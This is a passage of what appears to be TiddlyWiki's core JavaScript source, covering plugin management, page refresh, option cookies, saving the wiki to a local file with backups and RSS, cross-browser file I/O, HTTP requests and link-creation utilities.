	listWrapper.setAttribute("params",paramString);
	this.refresh(listWrapper,paramString);
};

config.macros.plugins.refresh = function(listWrapper,params)
{
	var wizard = new Wizard(listWrapper);
	var selectedRows = [];
	ListView.forEachSelector(listWrapper,function(e,rowName) {
			if(e.checked)
				selectedRows.push(e.getAttribute("rowName"));
		});
	removeChildren(listWrapper);
	params = params.parseParams("anon");
	var plugins = installedPlugins.slice(0);
	var t,tiddler,p;
	var configTiddlers = store.getTaggedTiddlers("systemConfig");
	for(t=0; t<configTiddlers.length; t++) {
		tiddler = configTiddlers[t];
		if(plugins.findByField("title",tiddler.title) == null) {
			p = getPluginInfo(tiddler);
			p.executed = false;
			p.log.splice(0,0,this.skippedText);
			plugins.push(p);
		}
	}
	for(t=0; t<plugins.length; t++) {
		p = plugins[t];
		p.size = p.tiddler.text ? p.tiddler.text.length : 0;
		p.forced = p.tiddler.isTagged("systemConfigForce");
		p.disabled = p.tiddler.isTagged("systemConfigDisable");
		p.Selected = selectedRows.indexOf(plugins[t].title) != -1;
	}
	if(plugins.length == 0) {
		createTiddlyElement(listWrapper,"em",null,null,this.noPluginText);
		wizard.setButtons([]);
	} else {
		var listView = ListView.create(listWrapper,plugins,this.listViewTemplate,this.onSelectCommand);
		wizard.setValue("listView",listView);
		wizard.setButtons([
				{caption: config.macros.plugins.removeLabel, tooltip: config.macros.plugins.removePrompt, onClick:  config.macros.plugins.doRemoveTag},
				{caption: config.macros.plugins.deleteLabel, tooltip: config.macros.plugins.deletePrompt, onClick:  config.macros.plugins.doDelete}
			]);
	}
};

config.macros.plugins.doRemoveTag = function(e)
{
	var wizard = new Wizard(this);
	var listView = wizard.getValue("listView");
	var rowNames = ListView.getSelectedRows(listView);
	if(rowNames.length == 0) {
		alert(config.messages.nothingSelected);
	} else {
		for(var t=0; t<rowNames.length; t++)
			store.setTiddlerTag(rowNames[t],false,"systemConfig");
	}
};

config.macros.plugins.doDelete = function(e)
{
	var wizard = new Wizard(this);
	var listView = wizard.getValue("listView");
	var rowNames = ListView.getSelectedRows(listView);
	if(rowNames.length == 0) {
		alert(config.messages.nothingSelected);
	} else {
		if(confirm(config.macros.plugins.confirmDeleteText.format([rowNames.join(", ")]))) {
			for(t=0; t<rowNames.length; t++) {
				store.removeTiddler(rowNames[t]);
				story.closeTiddler(rowNames[t],true);
			}
		}
	}
};

//--
//-- Message area
//--

function getMessageDiv()
{
	var msgArea = document.getElementById("messageArea");
	if(!msgArea)
		return null;
	if(!msgArea.hasChildNodes())
		createTiddlyButton(createTiddlyElement(msgArea,"div",null,"messageToolbar"),
			config.messages.messageClose.text,
			config.messages.messageClose.tooltip,
			clearMessage);
	msgArea.style.display = "block";
	return createTiddlyElement(msgArea,"div");
}

function displayMessage(text,linkText)
{
	var e = getMessageDiv();
	if(!e) {
		alert(text);
		return;
	}
	if(linkText) {
		var link = createTiddlyElement(e,"a",null,null,text);
		link.href = linkText;
		link.target = "_blank";
	} else {
		e.appendChild(document.createTextNode(text));
	}
}

function clearMessage()
{
	var msgArea = document.getElementById("messageArea");
	if(msgArea) {
		removeChildren(msgArea);
		msgArea.style.display = "none";
	}
	return false;
}

//--
//-- Refresh mechanism
//--

config.refreshers = {
	link: function(e,changeList)
		{
		var title = e.getAttribute("tiddlyLink");
		refreshTiddlyLink(e,title);
		return true;
		},
	
	tiddler: function(e,changeList)
		{
		var title = e.getAttribute("tiddler");
		var template = e.getAttribute("template");
		if(changeList && changeList.indexOf(title) != -1 && !story.isDirty(title))
			story.refreshTiddler(title,template,true);
		else
			refreshElements(e,changeList);
		return true;
		},

	content: function(e,changeList)
		{
		var title = e.getAttribute("tiddler");
		var force = e.getAttribute("force");
		if(force != null || changeList == null || changeList.indexOf(title) != -1) {
			removeChildren(e);
			wikify(store.getTiddlerText(title,title),e,null);
			return true;
		} else
			return false;
		},

	macro: function(e,changeList)
		{
		var macro = e.getAttribute("macroName");
		var params = e.getAttribute("params");
		if(macro)
			macro = config.macros[macro];
		if(macro && macro.refresh)
			macro.refresh(e,params);
		return true;
		}
};

function refreshElements(root,changeList)
{
	var nodes = root.childNodes;
	for(var c=0; c<nodes.length; c++) {
		var e = nodes[c], type = null;
		if(e.getAttribute  && (e.tagName ? e.tagName != "IFRAME" : true))
			type = e.getAttribute("refresh");
		var refresher = config.refreshers[type];
		var refreshed = false;
		if(refresher != undefined)
			refreshed = refresher(e,changeList);
		if(e.hasChildNodes() && !refreshed)
			refreshElements(e,changeList);
	}
}

function applyHtmlMacros(root,tiddler)
{
	var e = root.firstChild;
	while(e) {
		var nextChild = e.nextSibling;
		if(e.getAttribute) {
			var macro = e.getAttribute("macro");
			if(macro) {
				var params = "";
				var p = macro.indexOf(" ");
				if(p != -1) {
					params = macro.substr(p+1);
					macro = macro.substr(0,p);
				}
				invokeMacro(e,macro,params,null,tiddler);
			}
		}
		if(e.hasChildNodes())
			applyHtmlMacros(e,tiddler);
		e = nextChild;
	}
}

function refreshPageTemplate(title)
{
	var stash = createTiddlyElement(document.body,"div");
	stash.style.display = "none";
	var display = document.getElementById("tiddlerDisplay");
	var nodes,t;
	if(display) {
		nodes = display.childNodes;
		for(t=nodes.length-1; t>=0; t--)
			stash.appendChild(nodes[t]);
	}
	var wrapper = document.getElementById("contentWrapper");
	if(!title)
		title = "PageTemplate";
	var html = store.getRecursiveTiddlerText(title,null,10);
	wrapper.innerHTML = html;
	applyHtmlMacros(wrapper);
	refreshElements(wrapper);
	display = document.getElementById("tiddlerDisplay");
	removeChildren(display);
	if(!display)
		display = createTiddlyElement(wrapper,"div","tiddlerDisplay");
	nodes = stash.childNodes;
	for(t=nodes.length-1; t>=0; t--)
		display.appendChild(nodes[t]);
	removeNode(stash);
}

function refreshDisplay(hint)
{
	if(typeof hint == "string")
		hint = [hint];
	var e = document.getElementById("contentWrapper");
	refreshElements(e,hint);
	if(backstage.isPanelVisible()) {
		e = document.getElementById("backstage");
		refreshElements(e,hint);
	}
}

function refreshPageTitle()
{
	document.title = getPageTitle();
}

function getPageTitle()
{
	var st = wikifyPlain("SiteTitle");
	var ss = wikifyPlain("SiteSubtitle");
	return st + ((st == "" || ss == "") ? "" : " - ") + ss;
}

function refreshStyles(title,doc)
{
	if(!doc)
		doc = document;
	setStylesheet(title == null ? "" : store.getRecursiveTiddlerText(title,"",10),title,doc);
}

function refreshColorPalette(title)
{
	if(!startingUp)
		refreshAll();
}

function refreshAll()
{
	refreshPageTemplate();
	refreshDisplay();
	refreshStyles("StyleSheetLayout");
	refreshStyles("StyleSheetColors");
	refreshStyles("StyleSheet");
	refreshStyles("StyleSheetPrint");
}

//--
//-- Options cookie stuff
//--

config.optionHandlers = {
	'txt': {
		get: function(name) {return encodeCookie(config.options[name].toString());},
		set: function(name,value) {config.options[name] = decodeCookie(value);}
	},
	'chk': {
		get: function(name) {return config.options[name] ? "true" : "false";},
		set: function(name,value) {config.options[name] = value == "true";}
	}
};

function loadOptionsCookie()
{
	if(safeMode)
		return;
	var cookies = document.cookie.split(";");
	for(var c=0; c<cookies.length; c++) {
		var p = cookies[c].indexOf("=");
		if(p != -1) {
			var name = cookies[c].substr(0,p).trim();
			var value = cookies[c].substr(p+1).trim();
			var optType = name.substr(0,3);
			if(config.optionHandlers[optType] && config.optionHandlers[optType].set)
				config.optionHandlers[optType].set(name,value);
		}
	}
}

function saveOptionCookie(name)
{
	if(safeMode)
		return;
	var c = name + "=";
	var optType = name.substr(0,3);
	if(config.optionHandlers[optType] && config.optionHandlers[optType].get)
		c += config.optionHandlers[optType].get(name);
	c += "; expires=Fri, 1 Jan 2038 12:00:00 UTC; path=/";
	document.cookie = c;
}

function encodeCookie(s)
{
	return escape(manualConvertUnicodeToUTF8(s));
}

function decodeCookie(s)
{
	s = unescape(s);
	var re = /&#[0-9]{1,5};/g;
	return s.replace(re,function($0) {return String.fromCharCode(eval($0.replace(/[&#;]/g,"")));});
}

//--
//-- Saving
//--

var saveUsingSafari = false;

var startSaveArea = '<div id="' + 'storeArea">'; // Split up into two so that indexOf() of this source doesn't find it
var endSaveArea = '</d' + 'iv>';

// If there are unsaved changes, force the user to confirm before exitting
function confirmExit()
{
	hadConfirmExit = true;
	if((store && store.isDirty && store.isDirty()) || (story && story.areAnyDirty && story.areAnyDirty()))
		return config.messages.confirmExit;
}

// Give the user a chance to save changes before exitting
function checkUnsavedChanges()
{
	if(store && store.isDirty && store.isDirty() && window.hadConfirmExit === false) {
		if(confirm(config.messages.unsavedChangesWarning))
			saveChanges();
	}
}

function updateLanguageAttribute(s)
{
	if(config.locale) {
		var mRE = /(<html(?:.*?)?)(?: xml:lang\="([a-z]+)")?(?: lang\="([a-z]+)")?>/;
		var m = mRE.exec(s);
		if(m) {
			var t = m[1];
			if(m[2])
				t += ' xml:lang="' + config.locale + '"';
			if(m[3])
				t += ' lang="' + config.locale + '"';
			t += ">";
			s = s.substr(0,m.index) + t + s.substr(m.index+m[0].length);
		}
	}
	return s;
}

function updateMarkupBlock(s,blockName,tiddlerName)
{
	return s.replaceChunk(
			"<!--%0-START-->".format([blockName]),
			"<!--%0-END-->".format([blockName]),
			"\n" + store.getRecursiveTiddlerText(tiddlerName,"") + "\n");
}

function updateOriginal(original,posDiv)
{
	if(!posDiv)
		posDiv = locateStoreArea(original);
	if(!posDiv) {
		alert(config.messages.invalidFileError.format([localPath]));
		return null;
	}
	var revised = original.substr(0,posDiv[0] + startSaveArea.length) + "\n" +
				convertUnicodeToUTF8(store.allTiddlersAsHtml()) + "\n" +
				original.substr(posDiv[1]);
	var newSiteTitle = convertUnicodeToUTF8(getPageTitle()).htmlEncode();
	revised = revised.replaceChunk("<title"+">","</title"+">"," " + newSiteTitle + " ");
	revised = updateLanguageAttribute(revised);
	revised = updateMarkupBlock(revised,"PRE-HEAD","MarkupPreHead");
	revised = updateMarkupBlock(revised,"POST-HEAD","MarkupPostHead");
	revised = updateMarkupBlock(revised,"PRE-BODY","MarkupPreBody");
	revised = updateMarkupBlock(revised,"POST-SCRIPT","MarkupPostBody");
	return revised;
}

function locateStoreArea(original)
{
	// Locate the storeArea div's
	var posOpeningDiv = original.indexOf(startSaveArea);
	var limitClosingDiv = original.indexOf("<"+"!--POST-STOREAREA--"+">");
	if(limitClosingDiv == -1)
		limitClosingDiv = original.indexOf("<"+"!--POST-BODY-START--"+">");
	var posClosingDiv = original.lastIndexOf(endSaveArea,limitClosingDiv == -1 ? original.length : limitClosingDiv);
	return (posOpeningDiv != -1 && posClosingDiv != -1) ? [posOpeningDiv,posClosingDiv] : null;
}

function autoSaveChanges(onlyIfDirty,tiddlers)
{
	if(config.options.chkAutoSave)
		saveChanges(onlyIfDirty,tiddlers);
}

// Save this tiddlywiki with the pending changes
function saveChanges(onlyIfDirty,tiddlers)
{
	if(onlyIfDirty && !store.isDirty())
		return;
	clearMessage();
	// Get the URL of the document
	var originalPath = document.location.toString();
	// Check we were loaded from a file URL
	if(originalPath.substr(0,5) != "file:") {
		alert(config.messages.notFileUrlError);
		if(store.tiddlerExists(config.messages.saveInstructions))
			story.displayTiddler(null,config.messages.saveInstructions);
		return;
	}
	var localPath = getLocalPath(originalPath);
	// Load the original file
	var original = loadFile(localPath);
	if(original == null) {
		alert(config.messages.cantSaveError);
		if(store.tiddlerExists(config.messages.saveInstructions))
			story.displayTiddler(null,config.messages.saveInstructions);
		return;
	}
	// Locate the storeArea div's
	var posDiv = locateStoreArea(original);
	if(!posDiv) {
		alert(config.messages.invalidFileError.format([localPath]));
		return;
	}
	saveBackup(localPath,original);
	saveRss(localPath);
	saveEmpty(localPath,original,posDiv);
	saveMain(localPath,original,posDiv);
}

function saveBackup(localPath,original)
{
	// Save the backup
	if(config.options.chkSaveBackups) {
		var backupPath = getBackupPath(localPath);
		var backup = config.browser.isIE ? ieCopyFile(backupPath,localPath) : saveFile(backupPath,original);
		if(backup)
			displayMessage(config.messages.backupSaved,"file://" + backupPath);
		else
			alert(config.messages.backupFailed);
	}
}

function saveRss(localPath)
{
	if(config.options.chkGenerateAnRssFeed) {
		var rssPath = localPath.substr(0,localPath.lastIndexOf(".")) + ".xml";
		var rssSave = saveFile(rssPath,convertUnicodeToUTF8(generateRss()));
		if(rssSave)
			displayMessage(config.messages.rssSaved,"file://" + rssPath);
		else
			alert(config.messages.rssFailed);
	}
}

function saveEmpty(localPath,original,posDiv)
{
	if(config.options.chkSaveEmptyTemplate) {
		var emptyPath,p;
		if((p = localPath.lastIndexOf("/")) != -1)
			emptyPath = localPath.substr(0,p) + "/empty.html";
		else if((p = localPath.lastIndexOf("\\")) != -1)
			emptyPath = localPath.substr(0,p) + "\\empty.html";
		else
			emptyPath = localPath + ".empty.html";
		var empty = original.substr(0,posDiv[0] + startSaveArea.length) + original.substr(posDiv[1]);
		var emptySave = saveFile(emptyPath,empty);
		if(emptySave)
			displayMessage(config.messages.emptySaved,"file://" + emptyPath);
		else
			alert(config.messages.emptyFailed);
	}
}

function saveMain(localPath,original,posDiv)
{
	var save;
	try {
		var revised = updateOriginal(original,posDiv);
		save = saveFile(localPath,revised);
	} catch (ex) {
		showException(ex);
	}
	if(save) {
		displayMessage(config.messages.mainSaved,"file://" + localPath);
		store.setDirty(false);
	} else {
		alert(config.messages.mainFailed);
	}
}

function getLocalPath(origPath)
{
	var originalPath = convertUriToUTF8(origPath,config.options.txtFileSystemCharSet);
	// Remove any location or query part of the URL
	var argPos = originalPath.indexOf("?");
	if(argPos != -1)
		originalPath = originalPath.substr(0,argPos);
	var hashPos = originalPath.indexOf("#");
	if(hashPos != -1)
		originalPath = originalPath.substr(0,hashPos);
	// Convert file://localhost/ to file:///
	if(originalPath.indexOf("file://localhost/") == 0)
		originalPath = "file://" + originalPath.substr(16);
	// Convert to a native file format
	var localPath;
	if(originalPath.charAt(9) == ":") // pc local file
		localPath = unescape(originalPath.substr(8)).replace(new RegExp("/","g"),"\\");
	else if(originalPath.indexOf("file://///") == 0) // FireFox pc network file
		localPath = "\\\\" + unescape(originalPath.substr(10)).replace(new RegExp("/","g"),"\\");
	else if(originalPath.indexOf("file:///") == 0) // mac/unix local file
		localPath = unescape(originalPath.substr(7));
	else if(originalPath.indexOf("file:/") == 0) // mac/unix local file
		localPath = unescape(originalPath.substr(5));
	else // pc network file
		localPath = "\\\\" + unescape(originalPath.substr(7)).replace(new RegExp("/","g"),"\\");
	return localPath;
}

function getBackupPath(localPath)
{
	var backSlash = true;
	var dirPathPos = localPath.lastIndexOf("\\");
	if(dirPathPos == -1) {
		dirPathPos = localPath.lastIndexOf("/");
		backSlash = false;
	}
	var backupFolder = config.options.txtBackupFolder;
	if(!backupFolder || backupFolder == "")
		backupFolder = ".";
	var backupPath = localPath.substr(0,dirPathPos) + (backSlash ? "\\" : "/") + backupFolder + localPath.substr(dirPathPos);
	backupPath = backupPath.substr(0,backupPath.lastIndexOf(".")) + "." + (new Date()).convertToYYYYMMDDHHMMSSMMM() + ".html";
	return backupPath;
}

function generateRss()
{
	var s = [];
	var d = new Date();
	var u = store.getTiddlerText("SiteUrl");
	// Assemble the header
	s.push("<" + "?xml version=\"1.0\"?" + ">");
	s.push("<rss version=\"2.0\">");
	s.push("<channel>");
	s.push("<title" + ">" + wikifyPlain("SiteTitle").htmlEncode() + "</title" + ">");
	if(u)
		s.push("<link>" + u.htmlEncode() + "</link>");
	s.push("<description>" + wikifyPlain("SiteSubtitle").htmlEncode() + "</description>");
	s.push("<language>en-us</language>");
	s.push("<copyright>Copyright " + d.getFullYear() + " " + config.options.txtUserName.htmlEncode() + "</copyright>");
	s.push("<pubDate>" + d.toGMTString() + "</pubDate>");
	s.push("<lastBuildDate>" + d.toGMTString() + "</lastBuildDate>");
	s.push("<docs>http://blogs.law.harvard.edu/tech/rss</docs>");
	s.push("<generator>TiddlyWiki " + version.major + "." + version.minor + "." + version.revision + "</generator>");
	// The body
	var tiddlers = store.getTiddlers("modified","excludeLists");
	var n = config.numRssItems > tiddlers.length ? 0 : tiddlers.length-config.numRssItems;
	for (var t=tiddlers.length-1; t>=n; t--)
		s.push(tiddlers[t].saveToRss(u));
	// And footer
	s.push("</channel>");
	s.push("</rss>");
	// Save it all
	return s.join("\n");
}

//--
//-- Filesystem code
//--

function convertUTF8ToUnicode(u)
{
	if(window.netscape == undefined)
		return manualConvertUTF8ToUnicode(u);
	else
		return mozConvertUTF8ToUnicode(u);
}

function manualConvertUTF8ToUnicode(utf)
{
	var uni = utf;
	var src = 0;
	var dst = 0;
	var b1, b2, b3;
	var c;
	while(src < utf.length) {
		b1 = utf.charCodeAt(src++);
		if(b1 < 0x80) {
			dst++;
		} else if(b1 < 0xE0) {
			b2 = utf.charCodeAt(src++);
			c = String.fromCharCode(((b1 & 0x1F) << 6) | (b2 & 0x3F));
			uni = uni.substring(0,dst++).concat(c,utf.substr(src));
		} else {
			b2 = utf.charCodeAt(src++);
			b3 = utf.charCodeAt(src++);
			c = String.fromCharCode(((b1 & 0xF) << 12) | ((b2 & 0x3F) << 6) | (b3 & 0x3F));
			uni = uni.substring(0,dst++).concat(c,utf.substr(src));
		}
	}
	return uni;
}

function mozConvertUTF8ToUnicode(u)
{
	try {
		netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
		var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
		converter.charset = "UTF-8";
	} catch(ex) {
		return manualConvertUTF8ToUnicode(u);
	} // fallback
	var s = converter.ConvertToUnicode(u);
	var fin = converter.Finish();
	return (fin.length > 0) ? s+fin : s;
}

function convertUnicodeToUTF8(s)
{
	if(window.netscape == undefined)
		return manualConvertUnicodeToUTF8(s);
	else
		return mozConvertUnicodeToUTF8(s);
}

function manualConvertUnicodeToUTF8(s)
{
	var re = /[^\u0000-\u007F]/g ;
	return s.replace(re,function($0) {return "&#" + $0.charCodeAt(0).toString() + ";";});
}

function mozConvertUnicodeToUTF8(s)
{
	try {
		netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
		var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
		converter.charset = "UTF-8";
	} catch(ex) {
		return manualConvertUnicodeToUTF8(s);
	} // fallback
	var u = converter.ConvertFromUnicode(s);
	var fin = converter.Finish();
	if(fin.length > 0)
		return u + fin;
	else
		return u;
}

function convertUriToUTF8(uri,charSet)
{
	if(window.netscape == undefined || charSet == undefined || charSet == "")
		return uri;
	try {
		netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
		var converter = Components.classes["@mozilla.org/intl/utf8converterservice;1"].getService(Components.interfaces.nsIUTF8ConverterService);
	} catch(ex) {
		return uri;
	}
	return converter.convertURISpecToUTF8(uri,charSet);
}

function saveFile(fileUrl,content)
{
	var r = null;
	if(!r)
		r = mozillaSaveFile(fileUrl,content);
	if(!r)
		r = ieSaveFile(fileUrl,content);
	if(!r)
		r = javaSaveFile(fileUrl,content);
	return r;
}

function loadFile(fileUrl)
{
	var r = null;
	if((r == null) || (r == false))
		r = mozillaLoadFile(fileUrl);
	if((r == null) || (r == false))
		r = ieLoadFile(fileUrl);
	if((r == null) || (r == false))
		r = javaLoadFile(fileUrl);
	return r;
}

// Returns null if it can't do it, false if there's an error, true if it saved OK
function ieSaveFile(filePath,content)
{
	try {
		var fso = new ActiveXObject("Scripting.FileSystemObject");
	} catch(ex) {
		return null;
	}
	var file = fso.OpenTextFile(filePath,2,-1,0);
	file.Write(content);
	file.Close();
	return true;
}

// Returns null if it can't do it, false if there's an error, or a string of the content if successful
function ieLoadFile(filePath)
{
	try {
		var fso = new ActiveXObject("Scripting.FileSystemObject");
		var file = fso.OpenTextFile(filePath,1);
		var content = file.ReadAll();
		file.Close();
	} catch(ex) {
		return null;
	}
	return content;
}

function ieCopyFile(dest,source)
{
	try {
		var fso = new ActiveXObject("Scripting.FileSystemObject");
		fso.GetFile(source).Copy(dest);
	} catch(ex) {
		return false;
	}
	return true;
}

// Returns null if it can't do it, false if there's an error, true if it saved OK
function mozillaSaveFile(filePath,content)
{
	if(window.Components) {
		try {
			netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
			var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
			file.initWithPath(filePath);
			if(!file.exists())
				file.create(0,0664);
			var out = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
			out.init(file,0x20|0x02,00004,null);
			out.write(content,content.length);
			out.flush();
			out.close();
			return true;
		} catch(ex) {
			return false;
		}
	}
	return null;
}

// Returns null if it can't do it, false if there's an error, or a string of the content if successful
function mozillaLoadFile(filePath)
{
	if(window.Components) {
		try {
			netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
			var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
			file.initWithPath(filePath);
			if(!file.exists())
				return null;
			var inputStream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
			inputStream.init(file,0x01,00004,null);
			var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
			sInputStream.init(inputStream);
			return sInputStream.read(sInputStream.available());
		} catch(ex) {
			return false;
		}
	}
	return null;
}

function javaUrlToFilename(url)
{
	var f = "//localhost";
	if(url.indexOf(f) == 0)
		return url.substring(f.length);
	var i = url.indexOf(":");
	if(i > 0)
		return url.substring(i-1);
	return url;
}

function javaSaveFile(filePath,content)
{
	try {
		if(document.applets["TiddlySaver"])
			return document.applets["TiddlySaver"].saveFile(javaUrlToFilename(filePath),"UTF-8",content);
	} catch(ex) {
	}
	try {
		var s = new java.io.PrintStream(new java.io.FileOutputStream(javaUrlToFilename(filePath)));
		s.print(content);
		s.close();
	} catch(ex) {
		return null;
	}
	return true;
}

function javaLoadFile(filePath)
{
	try {
		if(document.applets["TiddlySaver"])
			return String(document.applets["TiddlySaver"].loadFile(javaUrlToFilename(filePath),"UTF-8"));
	} catch(ex) {
	}
	var content = [];
	try {
		var r = new java.io.BufferedReader(new java.io.FileReader(javaUrlToFilename(filePath)));
		var line;
		while((line = r.readLine()) != null)
			content.push(new String(line));
		r.close();
	} catch(ex) {
		return null;
	}
	return content.join("\n");
}

//--
//-- Server adaptor for talking to static files
//--

function FileAdaptor()
{
	this.host = null;
	this.store = null;
	return this;
}

FileAdaptor.NotLoadedError = "TiddlyWiki file has not been loaded";
FileAdaptor.serverType = 'file';

// Open the specified host/server
FileAdaptor.prototype.openHost = function(host,context,userParams,callback)
{
	this.host = host;
	if(!context)
		context = {};
	context.adaptor = this;
	context.callback = callback;
	context.userParams = userParams;
	var ret = loadRemoteFile(host,FileAdaptor.openHostCallback,context);
	return typeof(ret) == "string" ? ret : true;
};

FileAdaptor.openHostCallback = function(status,context,responseText,url,xhr)
{
	var adaptor = context.adaptor;
	context.status = status;
	if(!status) {
		context.statusText = "Error reading file: " + xhr.statusText;
	} else {
		// Load the content into a TiddlyWiki() object
		adaptor.store = new TiddlyWiki();
		if(!adaptor.store.importTiddlyWiki(responseText))
			context.statusText = config.messages.invalidFileError.format([url]);
	}
	context.callback(context,context.userParams);
};

// Gets the list of workspaces on a given server
FileAdaptor.prototype.getWorkspaceList = function(context,userParams,callback)
{
	if(!context)
		context = {};
	context.workspaces = [{title:"(default)"}];
	context.status = true;
	window.setTimeout(function() {callback(context,userParams);},10);
	return true;
};

// Open the specified workspace
FileAdaptor.prototype.openWorkspace = function(workspace,context,userParams,callback)
{
	if(!context)
		context = {};
	context.status = true;
	window.setTimeout(function() {callback(context,userParams);},10);
	return true;
};

// Gets the list of tiddlers within a given workspace
FileAdaptor.prototype.getTiddlerList = function(context,userParams,callback)
{
	if(!this.store)
		return FileAdaptor.NotLoadedError;
	if(!context)
		context = {};
	context.tiddlers = [];
	this.store.forEachTiddler(function(title,tiddler)
		{
		var t = new Tiddler(title);
		t.text = tiddler.text;
		t.modified = tiddler.modified;
		t.modifier = tiddler.modifier;
		t.fields['server.page.revision'] = tiddler.modified.convertToYYYYMMDDHHMM();
		t.tags = tiddler.tags;
		context.tiddlers.push(t);
		});
	context.status = true;
	window.setTimeout(function() {callback(context,userParams);},10);
	return true;
};

FileAdaptor.prototype.generateTiddlerInfo = function(tiddler)
{
	var info = {};
	info.uri = tiddler.fields['server.host'] + "#" + tiddler.title;
	return info;
};

// Retrieves a tiddler from a given workspace on a given server
FileAdaptor.prototype.getTiddler = function(title,context,userParams,callback)
{
	if(!this.store)
		return FileAdaptor.NotLoadedError;
	if(!context)
		context = {};
	context.tiddler = this.store.fetchTiddler(title);
	if(context.tiddler) {
		context.tiddler.fields['server.type'] = FileAdaptor.serverType;
		context.tiddler.fields['server.host'] = this.host;
		context.tiddler.fields['server.page.revision'] = context.tiddler.modified.convertToYYYYMMDDHHMM();
	}
	context.status = true;
	if(context.allowSynchronous) {
		context.isSynchronous = true;
		callback(context,userParams);
	} else {
		window.setTimeout(function() {callback(context,userParams);},10);
	}
	return true;
};

FileAdaptor.prototype.close = function()
{
	delete this.store;
	this.store = null;
};

config.adaptors[FileAdaptor.serverType] = FileAdaptor;

//--
//-- Remote HTTP requests
//--

function loadRemoteFile(url,callback,params)
{
	return doHttp("GET",url,null,null,null,null,callback,params,null);
}

// HTTP status codes
var httpStatus = {
	OK: 200,
	ContentCreated: 201,
	NoContent: 204,
	Unauthorized: 401,
	Forbidden: 403,
	NotFound: 404,
	MethodNotAllowed: 405
};

function doHttp(type,url,data,contentType,username,password,callback,params,headers)
{
	// Get an xhr object
	var x = getXMLHttpRequest();
	if(!x)
		return "Can't create XMLHttpRequest object";
	// Install callback
	x.onreadystatechange = function() {
		if (x.readyState == 4 && callback && (x.status !== undefined)) {
			if([0, httpStatus.OK, httpStatus.ContentCreated, httpStatus.NoContent].contains(x.status))
				callback(true,params,x.responseText,url,x);
			else
				callback(false,params,null,url,x);
			x.onreadystatechange = function(){};
			x = null;
		}
	};
	// Send request
	if(window.Components && window.netscape && window.netscape.security && document.location.protocol.indexOf("http") == -1)
		window.netscape.security.PrivilegeManager.enablePrivilege("UniversalBrowserRead");
	try {
		url = url + (url.indexOf("?") < 0 ? "?" : "&") + "nocache=" + Math.random();
		x.open(type,url,true,username,password);
		if (data)
			x.setRequestHeader("Content-Type", contentType ? contentType : "application/x-www-form-urlencoded");
		if (x.overrideMimeType)
			x.setRequestHeader("Connection", "close");
		if(headers) {
			for(n in headers)
				x.setRequestHeader(n,headers[n]);
		}
		x.setRequestHeader("X-Requested-With", "TiddlyWiki " + version.major + "." + version.minor + "." + version.revision + (version.beta ? " (beta " + version.beta + ")" : ""));
		x.send(data);
	} catch (ex) {
		return exceptionText(ex);
	}
	return x;
}

function getXMLHttpRequest()
{
	try {
		var x = new XMLHttpRequest(); // Modern
	} catch(ex) {
		try {
			x = new ActiveXObject("Msxml2.XMLHTTP"); // IE 6
		} catch (ex2) {
			return null;
		}
	}
	return x;
}

//--
//-- TiddlyWiki-specific utility functions
//--

function createTiddlyButton(theParent,theText,theTooltip,theAction,theClass,theId,theAccessKey)
{
	var theButton = document.createElement("a");
	if(theAction) {
		theButton.onclick = theAction;
		theButton.setAttribute("href","javascript:;");
	}
	if(theTooltip)
		theButton.setAttribute("title",theTooltip);
	if(theText)
		theButton.appendChild(document.createTextNode(theText));
	if(theClass)
		theButton.className = theClass;
	else
		theButton.className = "button";
	if(theId)
		theButton.id = theId;
	if(theParent)
		theParent.appendChild(theButton);
	if(theAccessKey)
		theButton.setAttribute("accessKey",theAccessKey);
	return theButton;
}

function createTiddlyLink(place,title,includeText,theClass,isStatic,linkedFromTiddler,noToggle)
{
	var text = includeText ? title : null;
	var i = getTiddlyLinkInfo(title,theClass);
	var btn = isStatic ? createExternalLink(place,store.getTiddlerText("SiteUrl",null) + "#" + title) : createTiddlyButton(place,text,i.subTitle,onClickTiddlerLink,i.classes);
	btn.setAttribute("refresh","link");
	btn.setAttribute("tiddlyLink",title);
	if(noToggle)
		btn.setAttribute("noToggle","true");
	if(linkedFromTiddler) {
		var fields = linkedFromTiddler.getInheritedFields();
		if(fields)
			btn.setAttribute("tiddlyFields",fields);
	}
	return btn;
}

function refreshTiddlyLink(e,title)
{
	var i = getTiddlyLinkInfo(title,e.className);
	e.className = i.classes;
	e.title = i.subTitle;
}

function getTiddlyLinkInfo(title,currClasses)
{
	var classes = currClasses ? currClasses.split(" ") : [];
	classes.pushUnique("tiddlyLink");
	var tiddler = store.fetchTiddler(title);
	var subTitle;
	if(tiddler) {
		subTitle = tiddler.getSubtitle();
		classes.pushUnique("tiddlyLinkExisting");
		classes.remove("tiddlyLinkNonExisting");
		classes.remove("shadow");
	} else {
		classes.remove("tiddlyLinkExisting");
		classes.pushUnique("tiddlyLinkNonExisting");
		if(store.isShadowTiddler(title)) {
			subTitle = config.messages.shadowedTiddlerToolTip.format([title]);
			classes.pushUnique("shadow");
		} else {
			subTitle = config.messages.undefinedTiddlerToolTip.format([title]);
			classes.remove("shadow");
		}
	}
	if(config.annotations[title])
		subTitle = config.annotations[title];
	return {classes: classes.join(" "),subTitle: subTitle};
}

function createExternalLink(place,url)
{
	var theLink = document.createElement("a");
	theLink.className = "externalLink";
	theLink.href = url;
	theLink.title = config.messages.externalLinkTooltip.format([url]);
	if(config.options.chkOpenInNewWindow)
		theLink.target = "_blank";
	place.appendChild(theLink);
	return theLink;
}

// Event handler for clicking on a tiddly link
function onClickTiddlerLink(e)
{
	if(!e) e = window.event;
	var theTarget = resolveTarget(e);
	var theLink = theTarget;
	var title = null;
	var fields = null;
	var noToggle = null;
	do {
		title = theLink.getAttribute("tiddlyLink");
